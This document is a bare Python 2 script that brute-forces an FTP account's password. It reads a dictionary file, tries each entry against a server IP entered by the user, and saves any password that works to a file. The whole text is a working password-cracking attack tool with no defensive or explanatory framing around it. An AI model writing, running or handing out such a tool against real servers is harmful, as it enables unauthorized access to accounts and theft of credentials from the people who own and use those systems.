#-*- coding: utf-8 -*-
import time
from ftplib import FTP

def crack(host, user, dictionaryFile, saveFile):
    try:
        fp=open(dictionaryFile, "r")
        for password in fp.readlines():
            try:
                password=password.strip()
                print "Try : "+password
                ftp=FTP(host) # FTP Connection
                ftp.login(user, password) # Try Login
                print "\n[+] Find FTP Password : "+password
                svfp=open(saveFile, "w")
                svfp.write("Account : "+user+"  password : "+password)
                svfp.close()
                print "[+] Open the "+saveFile
                fp.close()
                time.sleep(600)
                exit(0)
            except:
                continue
        print "\n[-] Not Found"
        fp.close()
        time.sleep(600)
        exit(0)
    except Exception, e:
        print "[-] ", e
        time.sleep(600)
        exit(0)

def main():
    try:
        host=raw_input("Input FTP Server IP : ")
        user=raw_input("Input FTP Account : ")
        dictionaryFile=raw_input("Input Dictionary File : ")
        saveFile=raw_input("Input Result Save File : ")
        crack(host, user, dictionaryFile, saveFile)
    except Exception, e:
        print "[-] ", e
        time.sleep(600)
        exit(0)

if __name__=='__main__':
    main()
